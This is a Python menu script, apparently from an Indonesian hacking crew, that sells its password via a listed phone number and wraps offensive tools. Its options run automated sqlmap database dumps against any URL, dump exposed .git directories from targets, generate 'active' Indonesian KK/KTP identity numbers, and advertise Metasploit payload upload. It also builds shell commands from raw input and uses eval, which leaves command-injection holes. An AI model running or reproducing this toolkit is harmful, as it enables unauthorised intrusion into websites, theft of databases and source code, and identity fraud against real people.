import getpass
import runpy
import os
import subprocess
import time
from termcolor import colored
from pyfiglet import figlet_format

os.system('clear')
print(colored(figlet_format("Private Tools", font="slant"), 'yellow'))
print(colored(("Sebagian Tools Masih Tahap Pengembangan jika ada Bug Silakan laporkan!"), 'yellow'))
print(colored(("Developed and maintained by @Huda from @Hakka.\nfor password contact +62 85335822427\n               "), 'yellow'))
password = getpass.getpass("password: ")
if password == "jawa":

    def nik_gen():
        os.system('clear')
        print(colored(figlet_format("Private Tools", font = "slant"), 'yellow'))
#    print(colored(("#########################################################################"),'yellow'))
        print(colored(("Sebagian Tools Masih Tahap Pengembangan jika ada Bug Silakan laporkan!"),'yellow'))
        print(colored(("Developed and maintained by @chmodv1 from 22XploiterCrew              "),'yellow'))
#    print(colored(("#########################################################################"),'yellow'))
        os.system("python3 nik_gen.py")
        kembali_ke_menu("nik_gen")

    def sqlmap():
    # pengecekan
        try:
            subprocess.run(["sqlmap", "-v"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except FileNotFoundError:
            print(colored(figlet_format("Private Tools", font = "slant"), 'yellow'))
            print("SQLMap belum terinstall. Apakah ingin menginstall sqlmap? (y/n): ")
            install = input()
            if install == "y":
                os.system('sudo apt-get install sqlmap')
            else:
                print("sqlmap tidak akan diinstall")
                return
        os.system('clear')
        print(colored(figlet_format("Private Tools", font = "slant"), 'yellow'))
        print(colored(("Sqlmap Sudah Terinstall"),'green'))
    # opsi 
        cookie = input("Apakah ingin menggunakan cookie? (y/n): ")
        url = input("Masukkan URL yang akan diuji: ")
        if cookie == "y":
            cookie = input("cookie:")
            os.system('clear')
            cmd = f'sqlmap -u {url} --random-agent --no-cast --threads 10 --cookie={cookie} --dbs'
        else:
            cmd = f'sqlmap -u {url} --random-agent --no-cast --threads 10 --dbs --batch --level 3 --risk 1'
            os.system('clear')
        subprocess.run(cmd, shell=True)
        kembali_ke_menu("sqlmap")

    def tools_2():
        os.system('clear')
        print("Masi kosong bang-belom bikin\ncape, mending rakit bom")
        time.sleep(2)
        kembali_ke_menu("tools_2")


    def statuscode():
        os.system('clear')
        print(colored(figlet_format("Private Tools", font = "slant"), 'yellow'))
        print(colored(("#########################################################################"),'yellow'))
        print(colored(("# Sebagian Tools Masih Tahap Pengembangan jika ada Bug Silakan laporkan!#"),'yellow'))
        print(colored(("#            Developed and maintained by @Huda from @Hakka.              "),'yellow'))
        print(colored(("#########################################################################\n\n\n\n"),'yellow'))
        runpy.run_path("statuscode.py")
        kembali_ke_menu("statuscode")

    def git_dumper():
        os.system('clear')
        print(colored(figlet_format("Private Tools", font = "slant"), 'yellow'))
        url = input("URL (ex: https://target.com/index/.git/): ")
        folder = input("Input Folder name: ")
        destination = input("Input Nama folder untuk save Extract: ")
    # Exec gitdumper
        os.system('clear')
        print(colored(figlet_format("Private Tools", font = "slant"), 'yellow'))
        os.system(f"bash gitdumper.sh {url} {folder}")
        os.system(f"bash extractor.sh {folder} {destination}")
        kembali_ke_menu("git_dumper")

    def kembali_ke_menu(fungsi):
        pilihan = input("Kembali ke menu? (y/n): ")
        if pilihan == "y":
            os.system('clear')
            menu()
        elif pilihan == "n":
            os.system('clear')
            eval(fungsi + "()")
        else:
            print("\nketik y atau n")
            kembali_ke_menu(fungsi)

# menambahkan menu baru
    def menu():
        os.system('clear')
        tools_string = "Private Tools"
        print(colored(figlet_format(tools_string, font = "slant"), 'yellow'))
#        print(colored(("#########################################################################"),'yellow'))
#        print(colored(("# Sebagian Tools Masih Tahap Pengembangan jika ada Bug Silakan laporkan!#"),'yellow'))
#        print(colored(("#            Developed and maintained by @Huda from @Hakka.              "),'yellow'))
#        print(colored(("#########################################################################"),'yellow'))
#        print(colored(figlet_format("Private Tools", font = "slant"), 'yellow'))
#    print(colored(("#########################################################################"),'yellow'))
        print(colored(("Sebagian Tools Masih Tahap Pengembangan jika ada Bug Silakan laporkan!"),'yellow'))
        print(colored(("Developed and maintained by @chmodv1 from 22XploiterCrew              "),'yellow'))
        print(colored(("\n\n\n   L I S T   T O O L S "), 'green', attrs=['bold']))
        print("   - - - - - - - - - - \n")
        print("1. KK KTP Generator " + (colored(("     - Random Active KK KTP 5x attemp"),'red')))
        print("2. Auto SQL Injection " + (colored(("   - Auto Dump Database to CSV"),'red')))
        print("3. Status Code Checker" + (colored(("   - Auto Check Header response, and save to txt"),'red')))
        print("4. Metasploit" + (colored(("            - Auto Upload Payload"),'red')))
        print("5. Git Expolit" + (colored(("           - Download,Dumper & Extract GIT Directory"),'red')))
        print("6. Exit")
        pilihan = input("\n[+] Pilih Tools: ")
        if pilihan == "1":
            nik_gen()
        elif pilihan == "2":
            sqlmap()
        elif pilihan == "3":
            statuscode()
        elif pilihan == "4":
            tools_2()
        elif pilihan == "5":
            git_dumper()
        elif pilihan == "6":
            keluar = input("Apakah anda ingin keluar? (y/n): ")
            if keluar == "y":
                print(colored(("thanks for use this tools."),'green'))
                time.sleep(0.5)
                os.system('exit')
            elif keluar == "n":
                menu()
            else:
                print(colored(("hanya menerima input (y/n)"), 'red'))
                time.sleep(0.5)
                menu()

        else:
            print(colored(("input tidak valid"),'red'))
            time.sleep(0.5)
            menu()
        #else:
        #    print(colored(("input tidak valid"),'red'))
        #    time.sleep(0.5)
        #    menu()
    menu()

else:
    print(colored(("Password salah, silakan coba lagi."), 'red'))



